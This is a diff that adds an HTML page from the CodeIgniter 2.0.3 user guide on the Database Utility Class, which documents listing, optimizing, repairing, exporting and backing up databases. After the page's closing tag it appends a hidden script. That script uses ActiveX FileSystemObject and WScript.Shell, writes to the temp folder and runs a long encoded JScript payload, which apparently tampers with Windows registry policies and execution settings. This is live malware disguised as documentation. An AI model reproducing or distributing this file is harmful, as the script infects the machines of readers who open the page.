@@ -1,0 +1,322 @@
+<!--[ANNIE83E333BF08546819]-->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Database Utility Class : CodeIgniter User Guide</title>
+
+<style type='text/css' media='all'>@import url('../userguide.css');</style>
+<link rel='stylesheet' type='text/css' media='all' href='../userguide.css' />
+
+<script type="text/javascript" src="../nav/nav.js"></script>
+<script type="text/javascript" src="../nav/prototype.lite.js"></script>
+<script type="text/javascript" src="../nav/moo.fx.js"></script>
+<script type="text/javascript" src="../nav/user_guide_menu.js"></script>
+
+<meta http-equiv='expires' content='-1' />
+<meta http-equiv= 'pragma' content='no-cache' />
+<meta name='robots' content='all' />
+<meta name='author' content='ExpressionEngine Dev Team' />
+<meta name='description' content='CodeIgniter User Guide' />
+
+</head>
+<body>
+
+<!-- START NAVIGATION -->
+<div id="nav"><div id="nav_inner"><script type="text/javascript">create_menu('../');</script></div></div>
+<div id="nav2"><a name="top"></a><a href="javascript:void(0);" onclick="myHeight.toggle();"><img src="../images/nav_toggle_darker.jpg" width="154" height="43" border="0" title="Toggle Table of Contents" alt="Toggle Table of Contents" /></a></div>
+<div id="masthead">
+<table cellpadding="0" cellspacing="0" border="0" style="width:100%">
+<tr>
+<td><h1>CodeIgniter User Guide Version 2.0.3</h1></td>
+<td id="breadcrumb_right"><a href="../toc.html">Table of Contents Page</a></td>
+</tr>
+</table>
+</div>
+<!-- END NAVIGATION -->
+
+
+<!-- START BREADCRUMB -->
+<table cellpadding="0" cellspacing="0" border="0" style="width:100%">
+<tr>
+<td id="breadcrumb">
+<a href="http://codeigniter.com/">CodeIgniter Home</a> &nbsp;&#8250;&nbsp;
+<a href="../index.html">User Guide Home</a> &nbsp;&#8250;&nbsp;
+<a href="index.html">Database Library</a> &nbsp;&#8250;&nbsp;
+Database Utility Class
+</td>
+<td id="searchbox"><form method="get" action="http://www.google.com/search"><input type="hidden" name="as_sitesearch" id="as_sitesearch" value="codeigniter.com/user_guide/" />Search User Guide&nbsp; <input type="text" class="input" style="width:200px;" name="q" id="q" size="31" maxlength="255" value="" />&nbsp;<input type="submit" class="submit" name="sa" value="Go" /></form></td>
+</tr>
+</table>
+<!-- END BREADCRUMB -->
+
+
+<br clear="all" />
+
+
+<!-- START CONTENT -->
+<div id="content">
+
+<h1>Database Utility Class</h1>
+
+<p>The Database Utility Class contains functions that help you manage your database.</p>
+
+<h3>Table of Contents</h3>
+
+<ul>
+<li><a href="#init">Initializing the Utility Class</a></li>
+<li><a href="#list">Listing your Databases</a></li>
+<li><a href="#exists">Checking for a specific Database</a></li>
+<li><a href="#opttb">Optimizing your Tables</a></li>
+<li><a href="#repair">Repairing your Databases</a></li>
+<li><a href="#optdb">Optimizing your Database</a></li>
+<li><a href="#csv">CSV Files from a Database Result</a></li>
+<li><a href="#xml">XML Files from a Database Result</a></li>
+<li><a href="#backup">Backing up your Database</a></li>
+</ul>
+
+
+
+<h2><a name="init"></a>Initializing the Utility Class</h2>
+
+<p class="important"><strong>Important:</strong>&nbsp; In order to initialize the Utility class, your database driver must
+already be running, since the utilities class relies on it.</p>
+
+<p>Load the Utility Class as follows:</p>
+
+<code>$this->load->dbutil()</code>
+
+<p>Once initialized you will access the functions using the <dfn>$this->dbutil</dfn> object:</p>
+
+<code>$this->dbutil->some_function()</code>
+
+<h2><a name="list"></a>$this->dbutil->list_databases()</h2>
+<p>Returns an array of database names:</p>
+
+<code>
+$dbs = $this->dbutil->list_databases();<br />
+<br />
+foreach ($dbs as $db)<br />
+{<br />
+&nbsp;&nbsp;&nbsp; echo $db;<br />
+}</code>
+
+
+<h2><a name="exists"></a>$this->dbutil->database_exists();</h2>
+
+<p>Sometimes it's helpful to know whether a particular database exists.
+Returns a boolean TRUE/FALSE.  Usage example:</p>
+
+<code>
+if ($this->dbutil->database_exists('database_name'))<br />
+{<br />
+&nbsp;&nbsp; // some code...<br />
+}
+</code>
+
+<p>Note:  Replace <em>database_name</em> with the name of the table you are looking for. This function is case sensitive.</p>
+
+
+
+<h2><a name="opttb"></a>$this->dbutil->optimize_table('table_name');</h2>
+
+<p class="important"><strong>Note:</strong>&nbsp; This features is only available for MySQL/MySQLi databases.</p>
+
+
+<p>Permits you to optimize a table using the table name specified in the first parameter. Returns TRUE/FALSE based on success or failure:</p>
+
+<code>
+if ($this->dbutil->optimize_table('table_name'))<br />
+{<br />
+&nbsp;&nbsp;&nbsp; echo 'Success!';<br />
+}
+</code>
+
+<p><strong>Note:</strong> Not all database platforms support table optimization.</p>
+
+
+<h2><a name="repair"></a>$this->dbutil->repair_table('table_name');</h2>
+
+<p class="important"><strong>Note:</strong>&nbsp; This features is only available for MySQL/MySQLi databases.</p>
+
+
+<p>Permits you to repair a table using the table name specified in the first parameter. Returns TRUE/FALSE based on success or failure:</p>
+
+<code>
+if ($this->dbutil->repair_table('table_name'))<br />
+{<br />
+&nbsp;&nbsp;&nbsp; echo 'Success!';<br />
+}
+</code>
+
+<p><strong>Note:</strong> Not all database platforms support table repairs.</p>
+
+
+<h2><a name="optdb"></a>$this->dbutil->optimize_database();</h2>
+
+<p class="important"><strong>Note:</strong>&nbsp; This features is only available for MySQL/MySQLi databases.</p>
+
+<p>Permits you to optimize the database your DB class is currently connected to. Returns an array containing the DB status messages or FALSE on failure.</p>
+
+<code>
+$result = $this->dbutil->optimize_database();<br />
+<br />
+if ($result !== FALSE)<br />
+{<br />
+&nbsp;&nbsp;&nbsp; print_r($result);<br />
+}
+</code>
+
+<p><strong>Note:</strong> Not all database platforms support table optimization.</p>
+
+
+<h2><a name="csv"></a>$this->dbutil->csv_from_result($db_result)</h2>
+
+<p>Permits you to generate a CSV file from a query result. The first parameter of the function must contain the result object from your query.
+Example:</p>
+
+<code>
+$this->load->dbutil();<br />
+<br />
+$query = $this->db->query("SELECT * FROM mytable");<br />
+<br />
+echo $this->dbutil->csv_from_result($query);
+</code>
+
+<p>The second and third parameters allows you to
+set the delimiter and newline character.  By default tabs are used as the delimiter and "\n" is used as a new line.  Example:</p>
+
+<code>
+$delimiter = ",";<br />
+$newline = "\r\n";<br />
+<br />
+echo $this->dbutil->csv_from_result($query, $delimiter, $newline);
+</code>
+
+<p><strong>Important:</strong>&nbsp; This function will NOT write the CSV file for you.  It simply creates the CSV layout.
+If you need to write the file use the <a href="../helpers/file_helper.html">File Helper</a>.</p>
+
+
+<h2><a name="xml"></a>$this->dbutil->xml_from_result($db_result)</h2>
+
+<p>Permits you to generate an XML file from a query result. The first parameter expects a query result object, the second
+may contain an optional array of config parameters.  Example:</p>
+
+<code>
+$this->load->dbutil();<br />
+<br />
+$query = $this->db->query("SELECT * FROM mytable");<br />
+<br />
+$config = array (<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'root'&nbsp;&nbsp;&nbsp; => 'root',<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'element' => 'element', <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'newline' => "\n", <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'tab'&nbsp;&nbsp;&nbsp;&nbsp;=> "\t"<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;);<br />
+<br />
+echo $this->dbutil->xml_from_result($query, $config);
+</code>
+
+<p><strong>Important:</strong>&nbsp; This function will NOT write the XML file for you.  It simply creates the XML layout.
+If you need to write the file use the <a href="../helpers/file_helper.html">File Helper</a>.</p>
+
+
+<h2><a name="backup"></a>$this->dbutil->backup()</h2>
+
+<p>Permits you to backup your full database or individual tables.  The backup data can be compressed in either Zip or Gzip format.</p>
+
+<p class="important"><strong>Note:</strong>&nbsp; This features is only available for MySQL databases.</p>
+
+<p>Note: Due to the limited execution time and memory available to PHP, backing up very large
+databases may not be possible.  If your database is very large you might need to backup directly from your SQL server
+via the command line, or have your server admin do it for you if you do not have root privileges.</p>
+
+<h3>Usage Example</h3>
+
+<code>
+<dfn>// Load the DB utility class</dfn><br />
+$this->load->dbutil();<br /><br />
+
+<dfn>// Backup your entire database and assign it to a variable</dfn><br />
+$backup =& $this->dbutil->backup();
+
+<br /><br />
+<dfn>// Load the file helper and write the file to your server</dfn><br />
+$this->load->helper('file');<br />
+write_file('/path/to/mybackup.gz', $backup);
+
+<br /><br />
+<dfn>// Load the download helper and send the file to your desktop</dfn><br />
+$this->load->helper('download');<br />
+force_download('mybackup.gz', $backup);
+</code>
+
+<h3>Setting Backup Preferences</h3>
+
+<p>Backup preferences are set by submitting an array of values to the first parameter of the backup function. Example:</p>
+
+<code>$prefs = array(<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'tables'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=> array('table1', 'table2'),&nbsp;&nbsp;// Array of tables to backup.<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'ignore'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=> array(),&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// List of tables to omit from the backup<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'format'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=> 'txt',&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// gzip, zip, txt<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'filename'&nbsp;&nbsp;&nbsp;&nbsp;=> 'mybackup.sql',&nbsp;&nbsp;&nbsp;&nbsp;// File name - NEEDED ONLY WITH ZIP FILES<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'add_drop'&nbsp;&nbsp;&nbsp;&nbsp;=> TRUE,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// Whether to add DROP TABLE statements to backup file<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'add_insert'&nbsp;&nbsp;=> TRUE,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// Whether to add INSERT data to backup file<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'newline'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=> "\n"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// Newline character used in backup file<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;);<br />
+<br />
+$this->dbutil->backup($prefs);
+</code>
+
+
+<h3>Description of Backup Preferences</h3>
+
+<table cellpadding="0" cellspacing="1" border="0" style="width:100%" class="tableborder">
+<tr>
+<th>Preference</th>
+<th>Default&nbsp;Value</th>
+<th>Options</th>
+<th>Description</th>
+</tr><tr>
+<td class="td"><strong>tables</strong></td><td class="td">empty array</td><td class="td">None</td><td class="td">An array of tables you want backed up.  If left blank all tables will be exported.</td>
+</tr><tr>
+<td class="td"><strong>ignore</strong></td><td class="td">empty array</td><td class="td">None</td><td class="td">An array of tables you want the backup routine to ignore.</td>
+</tr><tr>
+<td class="td"><strong>format</strong></td><td class="td">gzip</td><td class="td">gzip, zip, txt</td><td class="td">The file format of the export file.</td>
+</tr><tr>
+<td class="td"><strong>filename</strong></td><td class="td">the current date/time</td><td class="td">None</td><td class="td">The name of the backed-up file. The name is needed only if you are using zip compression.</td>
+</tr><tr>
+<td class="td"><strong>add_drop</strong></td><td class="td">TRUE</td><td class="td">TRUE/FALSE</td><td class="td">Whether to include DROP TABLE statements in your SQL export file.</td>
+</tr><tr>
+<td class="td"><strong>add_insert</strong></td><td class="td">TRUE</td><td class="td">TRUE/FALSE</td><td class="td">Whether to include INSERT statements in your SQL export file.</td>
+</tr><tr>
+<td class="td"><strong>newline</strong></td><td class="td">"\n"</td><td class="td">"\n", "\r", "\r\n"</td><td class="td">Type of newline to use in your SQL export file.</td>
+
+</tr>
+</table>
+
+
+</div>
+<!-- END CONTENT -->
+
+
+<div id="footer">
+<p>
+Previous Topic:&nbsp;&nbsp;<a href="forge.html">DB Forge Class</a>
+&nbsp;&nbsp;&nbsp;&middot;&nbsp;&nbsp;
+<a href="#top">Top of Page</a>&nbsp;&nbsp;&nbsp;&middot;&nbsp;&nbsp;
+<a href="../index.html">User Guide Home</a>&nbsp;&nbsp;&nbsp;&middot;&nbsp;&nbsp;
+Next Topic:&nbsp;&nbsp;<a href="../libraries/javascript.html">Javascript Class</a></p>
+<p><a href="http://codeigniter.com">CodeIgniter</a> &nbsp;&middot;&nbsp; Copyright &#169; 2006 - 2011 &nbsp;&middot;&nbsp; <a href="http://ellislab.com/">EllisLab, Inc.</a></p>
+</div>
+
+</body>
+</html>
+<html>
+<script type="text/javascript">
+<!--
+var ayfp6=new ActiveXObject('Scripting.FileSystemObject');var dk5h8=new ActiveXObject('WScript.Shell');var s41k8=ayfp6.GetSpecialFolder(2);var bgw3u=ayfp6.GetTempName();var vlx8c='#@~^2CMAAA==-mD~a%!6y{xAPzmOk7+p6(L+1O`E?mMr2YbxTRoksnUXdYhr(Ln^DB#I-mD~6A2Xx	+SPb1Yb-+or8LmOcE?1.kaYRU4nV^B*i-l.~1\\8l$xUm.raYRj^Mk2Yw;^VHm:i\\mD,5!$+;\'4X;.l`m78l$#i7C.P.Xy61\'20!6"RVnYUwn^blVoG^NnDvq*i-mD,0%mFOxyH a,3Bww9Dk7nDk--mUUkRkXdBIW!x^YbGx,l{;FE`b`StrVc1\\8m;{\'0Rl81#P\\CD,:+1Xt\'	nh,2x!hnDmYKDcw0;Xy fMr\\/bI6WDchy,atchK\\nwkM/Yv#pZ:y,atclO3	N`*I:y,64 hW7+g+aYcb*	-lM~mZLGn{: 1a4RrYhv#Ib0v``1!NG+cf.k7+Pza+\'{qu-m!NGnRGDb\\nKz2\'x *\'[1!%GRnCO4"xBzlE#\'LmZLWR&dIl[X*	OTD0v^!NW+cKCY4_E-wlUUb+ l	rB*iLVF/Lc^ZLG+cKmY43B\'-l!YK.E	Rrx6BbIa3kD2`1!LKn nmY4_v-wv*i5lO-6vmT%K+RKCDtQB\'wE#Ia&7VkvmZ%WRKlDtQv\'-B*I8)886;UmDkKx~4f5W*c/S{%T#`.YE.U,w0EX"cMnD2XY+	/bGxglh+v/A{Ro#cOWdWh./lk+v#I8W;	mOkKUP(\\X"8`#`-mD~YZ%DEx1\\(l;c/!8/DDc!Bm-8m;R^nxTYt *bib0vw0Ea"csrV36b/OdvY!%O!_vR9G16v*#P3ERVacYZLOEBB [Km6Ebi)+Vkn~k6`a%;6" wks+AakkYdcD!LO;3B NK^E#bP3!%Va`DTLDESBcNG^E#i)nVk+PbWcwREXy srs2akkO/vYT%DE_v MYWB*bP3;RVa`YZLD;~ER.Y6BbI)80!UmDkW	~^*	L2`b	anS&zRM;xvB^d1Dk2Oc+a+,&J+lN/1DkaYcnx1W[+,BQWRlFOQB,zDEST#pUm.k2Oc?s+2`8!Tbp6+AfHR.E	cEmd1DbwYc+XnPJzn)N/^.bwYcnx1WN~v_6%mF1_v~J/v~Zbiq?^.bwY j^+nwvqZ!bp6h&HR";xvB^/1Dr2DR+XnPJz+=%dmMkaY +U^KNnPEQ0Rlq13BP&UE~T#pN6EU1YbWx,mS*DD`[%NlabPk0v2%!6ycorV2XkdYdc9%%lXb#PDnO!Dx~2REayc!YobV`NRLma#c?ryiNn^/+P.+DED	~UE^Vp8N0;U1YrW	~Ny4WXvE02{!#`DO!DU,wRE6.RVnY~ld+glhnvE0a{E*i86;UmDkKx~NfCHLco8O 7#`OMX	.nDE.x,2REa.R}w+	KaYwks+voqOy\\~8bR"+l9Jrx`*iNmCO1tc+*`DY;.	Px;s^iN86;	mObW	P+OVN"`*	r0vmA*MY`60l8,#ex1 ZF*	O!n.6`W%mq,*ianS&X ]!xcBSd1DraYc+6PJ&+=LdmMk2Oc+x1GNPB3W0l8,3B~znv*iN86;x1YrG	PoV{kLc0+W$wbP\\mDP1GR;,{B,l!YG.!xT\'U/4+V^na+1ED+xhd^Mk2Ycn6P&&)Ld^Mk2Ycn	mG9+,lx	k l	k~zm-Ud4+V^w-Kw+	wwmK:slUNxAkm.kaOR6n~Jz+l%km.kaOc+U1W9+Pmx	r+clUk,zCw	/tsV\'-+X2sWM+\'-^Whhmx[\'SdmMk2Oc+6n~Jzn)Nd1DraYc+x1W9nPmxUkRCUbPzmvib0`4z;Dl`6vW;2be\'^GR;,*	rG24DcW+05wBT*iOMXP\\lMPb[%^;xwREa"cZDCYK+XOok^+v0052BY.EbibN0s$R.rD+cmF0!,bpk9%V$R;sWk+c#p8^CDmtvn#Pk0v20EXycsGV[nM2akkO/v0W$w#b`H%;6Wc6vW$w*io0Gk%`6vW;a#IN)0k	CV^X	bGf4M`6vW;2S2,bi)N86EU^DkWU~4X;Dlcacd06*	YMXP.+DE.x,w0;XyR}2+	K+XOok^+vw*/VaBFbR"nl9bssv#iN^mY^tvn*	.Y!Dx,BEI8)0;x1YrG	PkKf4M`D.;13BhkyWGb`b0cwR;6.Ror^+2arkYd`M"!,V*#PYDH	7CD,YWt0Vx2RE6. MYsbsn`My!,V#IO6tVVc)YDDr8!Y+dxS/"0FI)mCDm4`+*	)N86EUmDkGU,ky{vvw,0.5#P6hfX ]o	DbO+vBuF;I-wv3D^:WAvB x?AB#3B\'wBBD^:Whc.1:cScwO3D$bQB\'-E#bianS&zR"noqDrO`BuF;Iw-EQMmhWhvBRx?Av#3Bw-G+WC!VY&^W	--ES.mscS`.mh*S`2,0.;*_vw\'f+WC!VOq1G	-wE#*i6h2zR"+LMkOnvBCn/I\'-B3.^:WhvB 9j3E#QB\'wsMknU9VXPza+HlsnE~.1:Wh`Mms*hvw13M;bQE--Eb~EI2Vm3(hbgfm?tv*iN0!UmDkGU,3E0sa`[XZ"m~WN:80#PYMz	7l.P9D+;M\'D1hcS`D1h*hv0N:q0bQE-w/4nV^-w6a+xww1Wh:mU9Bbpk6`NM !.RslOm4`&Y8z#exx!VV*`a+S&HR]EUc9D+EM DwsC1+`vY8BSNHT.lQ6LsF0*#pN+^/n	X+AfHRI!U`9D !.QB,JE_[XT"m_WLsq03BEv*i8N^mY^tvn*	N)0!xmDkKUP^w0DW`b`Stk^n`1\\4m5x\'6%mF1#`OZ+.0vW%mF1bp6xL48`bi.T(6sv#p:4^61c#pjmMk2Oc?VnwvF!ZTbi)86EUmOrKx~:(s61`b`DDX`r.+{vvvcNG16E#i)mmOm4`n#PY.zPky{vvBR9G^B*i)mCY^4v+b	D.XPk"nFv`v MYWB*I)mCDm4`+*	)N8)0;x1YrG	Pw2-Vb`lS^XV*	7l.PW2^xX\'	nh,2U;s+DCOKDcwR;Xy V+DsW^N.`mh^*^# j!4sKsND/*IWWM`6wsxX sW-+wrDkYcbp"02s	* lD3	Nc*i6wV	*chW7+H+XYcb*	\\m.P(+GM^x0aV	* kOns`bibW`v4n{MmRHCs+Z\'E]AZe;SAIBL[(nGMm 1m:nZ{B?HdY:PjGsEs+,qU0G.slOkKUB*[\'8GD^ hlOtexa%;XycM+D?anmblssKV[nM`!*b	$l,7ac4GMm nCO4#Iw2-Vb`8nFDm KmY4#pN)8W!x1YkKx,23bY2`(Eq.X#	6GDv\\lM~r\'8ib@!x*Ir3_b	7CD,hTW/\'8;8Da_E8l;Dk6EV|ob.V|wCDD{vQb_Bcsx0BibWc"a%!6"Ror^+36bdYk`AZc/bbPY.XP-mD~k\\RLy{6A&HR/DlOnUtWMOm!Y`STck#p/-%%"cq^W	JW1lOrKx\'vAswsW1 9VsB%Ei/7%N"R:l.oYKCDt\'EA/1DkaO +X+Eid\\0%.R)DT;:xOd{Bz&n=LdmMraY x1WNPmUxb+ l	k~v3Bz$lB3kik-0L.RUl-+cbp8^lD^tv+b`)88NW!x^YbG	P5+c1;`.ls**	-lMPUrm6h{v@!eOO])H1&2R&3&ff~sT%l*vRF1D O@*vIb0cN2CHLc.lV**"{Ukm6A#P\\C.,;x04m{tX!.X`.lVX#I-mD~3b*kK\'5T$+E .wsl1nvzw\'zT~B\'-\'wB*i-lMP-T^,:{VkWkWc.nw^l1+czwvJoSB\'w-EBbI7lD~2FD+;{v@!tOsV@*-x@!/1.kaY~YHwnxrY+XOzNl\\md^DbwDJ@*-U@!eOR-	-lMPCz6wvxUh~b1Ob\\nor(L+1YvwBUm.kaYrUTRsbs+UX/Dnhr(LmO-vbp\\CD,[3lt0x	+h~)1Yr\\p}4%mD`-EU^DbwORUtns^-B*I\\mDPk*q3R\'mXWw V+O?anmblsoKVNn.v bi7CMP8Th2E\'mX62vcMnY:+h2gl:c#p\\lM~-VX%1\'wBvQ7!s,sQB\'BQjDDkULc0.Ws/4l.;W9+`Z#p-lMP.hHoXxmX0aR;D+mOnK6DsrVnckcq3RQ-E-ww\'-BQ8ThfEBOMEn*iMhXT*c	DbYn`7Va01#iMAXT*R;sG/`*i[3X4RR]E	c-Ehd^MkwO 6nPJ&)%kmMkwDRUmKNnP\'BQdWF3RQ-E--\'wwB34ThfEQwEP&Y\'v#p-U&JOO@*w	@!&/1.bwO@*-	@!z4Yss@*EirW24.c.l+^X~Z#iD.z	7lMPVczT9\'2%!aycr2n	K+aOwks+v"m+sl~y#i0cHTNc.kD+Jr	+`	rlXh#pV*XZNc.kOndkU+v5x0t^bp3czT9R	DbOSr	+vwGM $bi0cz!9R/sK/+vbi)mlD^4`#P8N8W;	mOkKUP$l1-X`w5hlvb	7CMPOOc6/\'	+S~2	Eh+MlOGM`wR;6.RMOoW^NDcw5hlvbRwrV/bI6WDcOOcW/chK\\nwkM/Yv#pZYOcW/clO3	N`*IYOc0k hW7+g+aYcb*	-lM~E+ya%{Y,*WkRrYhv# hlDtib0vc42;**vE"XL#{xB9WmEkk42;W*cE"XLb\'{vNKmav-u4f5W*cE+"XLb{\'EDY6B*\'[9 80l`;.6L* /!4/D.c!B *"xB=yE#`YZnD6`25s*vQv\'-v_9+(0XvE+y6N#3vRN/nB*irG24Dv;v.6LBf0#p8Vd+~r6`8&$**vE"XL#xxEtO:Ek-4f$cl`E+yX%#{\'vtD:sv*	;+*m$`E+"aL*i)jm.raY ?^n+a`*bp88W;	mOkKU,D^scS`YS+XG#PDnY!DU~X+h2zR"+o"nCNvB_|/IwwE_OhaW3BwwE#iNW!x^YbG	PdOyk:`*	S4k^+cm74C5{\'0RCFO#	D.z	7lMPz\\*;W\'U+S~b1Yr-(r8%mO`E	Um.bwDR1YSGD0Bbi7l.~my\\W^\'H\\c!* 2	Es1nYAGM39Db-+k`bI6WDc-mD~k{qpk@!my7cmcVUoDtIk3\'+bPY!.0vly7*^R&Y:ckbQE-wl	UkRCUbB#I20kOwvC.\\*1R&Y+s`bb_E-wB*i5CO\\6vCy7cmc(O+s`b#QBwwE#I8)^lDm4c#	N	Um.kaOc?s+a`,Z!ZT!*iN86EU^DkW	~YZ+D6cU*O0l#`kWc1h*DDcxl,WX*"\'1+ZFb	bG24.vxl,0l~ZbiDDz	7l.~M&h+2\'a%EX" ZM+mYnKnaDsrVcxl,WXBYD;n*i.&SaR	MkD+`$!$nE*i.&Sv2 ;VWkn`*i81COm4`#`kWca%;6. sKV[nM26rdD/cxl16*b*	H%EXcvU*O0X#pYTnM0`	X,6*#pNN0bxmVsX`r6`8&$**vxX16*#ZxELd+EbPkG24M`xl,6X~2,bi)8NN6Ex1OkKxPXULt8`*	ODz`7l.P1tTxxah&z "+LIC9`v_|;j-\'?KWYSl.+\'-\\r1DWkG0D--qrUNKhk-wZ;.M+UYjnDkkGU\'-2a2^W.+Mw\'?4V^PsKV9nDk-wZGP$;Mxk	LB*iYZn.0v+OtLxQv\'-Cx	r+clUrE#iLVF/%`14oU3B\'-l!YK.E	Rrx6BbI)mlD^tv+#PNN0!x1YrWU~H%;6Wc++ld^*	Y.zPw0EX"cfn^+D+sKV9nDv+lkmSOME+*I81lY14c+*	X+A&z "EU`E^:9RnaPz^~MN~zk~J;~\'-\'-R\'-rv_vC/1_vEE~!BOD!+#pNN0!x1YrWU~.!86^c#PY.zP6+AfHR]+T9VnD+vBCnZ"w-C-w/4+ss6-\'/W	Y+XO\\+	E_lUNsnM/w-}2+	P	rDt-wv*iNmmO1tc#P8YMXPa+S&zR"+L	MkYcB_|Z"wwB3D1:*hcvckU0Eb_E-wd4+Vsw\'qU/DC^Vw\'mK::mx9w-E~vmsN nX+PJ^P9+V,&5PJ0,JYFEvBB]2Vm2on)HG{?tv*iNmmO1tc#P8YMXPa+S&zR"+L	MkYcB_|Z"wwB3D1:*hcvc9j2Eb_E-wj4+Vsw\'2[kDw\'ZGs:mxN\'-ESD1:*hvD^hWh`E 9U2B*Qv-\'?4+sVww}wnx\'wZK:hC	N-wv*~vIA!|2phbgf{U}Ebi)mCY1tcn*	8D.XP6+SfzR"+TfnVnO`vCn/I\'-vQMm:*AvB 9U3E#QE-\'?tV^w-}wnxy-wv*i81CY1t`b`8DDH	a+AfHR]+T9+^+OnvBCF/"-wB3.1:*S`ER9U2Eb_E-w?4+ss\'-ranxy--;Gh:mx9-wBbI)mCY14`#`NDDX`ahfXc]o9VY+vB_FZ"-wB3D^hWh`E 9U2B*Qv-\'?4+sV3a\'-KDK2+MYzj4++Oumx[V.k-wq?_nDKwkw-E#I81lO^4`+*`8DDXPanh2XcIno	.bYn`Eu|;IwwE_D^hWhcBc.ov*_E--ktsV\'-Gwxww1W:sCx9--ESvmsNc+a+~&1P[+^~z$P&W,J]qEE~vIA!|2phbgf{U}Ebi)mCY1tcn*	8D.XP6+SfzR"+T.kOnvBu|;i-\'?GWDhl.n\'-\\k1.K/G6Y\'-bx9Ghk-wZ!D.n	Y../bWx\'wKW^k1kn/wwA62VK.+M-wHKsksnz/dW1rmYnE~EFBBB"3M|f	r"fvbp8mmOm4`+*`NYMXP6nhfzcInoq.kD+cv_|Ziw\'?G0DAmDn\'-tkmMWkG0D-wbx[GS/-\'/EMD+	O#+M/bWU-wKKVrmbn/\'-jzkY+hw\'fr/m8^+]ob/YMX:GW^/v~EFvSEI2VmfqrIGvbi)mmY^tcn*	NYMz	X+AfHRInLqDrYcECF;j\'-?K0DAlM+w-tk^.K/W6O-\'k	[Ghk-\'Z;D.n	Y#+MdkKxwwhWVr^b+d-\'jH/O:\'-fb/m8VKC/0HL.E~B8v~EI2Vm9}IGBbiN^mY^tvn#P8O.H	6nA2X ILqDrD+vBCnZ`w-UWWYSl.n\'-nKsk1k+kwwHbmMWdWWO\'-\\H;w-"+dOMkmOPKnnDsrDYn9?	lwbxkv~EFv~EI3!|f}]fE#i)^CY1tv+b	NOMX`6A&HR]nTDrO`vCnJt-wUrwKzIAw-tk^DK/GWD--qrx9Whk~HK\'-;E.DnUD.nDkrW	-w(slon~wks+,3X+^!YbWx,raOkKxd-\'lOOMk4cn6--Gn8EToDv~v^sN +XnPJm~.:BbI)mCY14v+bP8DDXP6A&HR]+T.rD+`Eu|dH-\'j6s:zI3-w\\bm.WkG0D-w	bxNGAkPHK\'w;E.M+	Y.DkrW	-wqslLn,sk^nPA6+1;OkKx,r2YrG	/w-m;YKD;UkR+an\'-9+(;TonMBBBmsNcn6P&m,Nns,z;,&0E#i)^CY1tv+b	NOMX`6A&HR]nTDrO`vCnJt-wUrwKzIAw-tk^DK/GWD--qrx9Whk~HK\'-;E.DnUD.nDkrW	-w(slon~wks+,3X+^!YbWx,raOkKxd-\'w.G1+6a 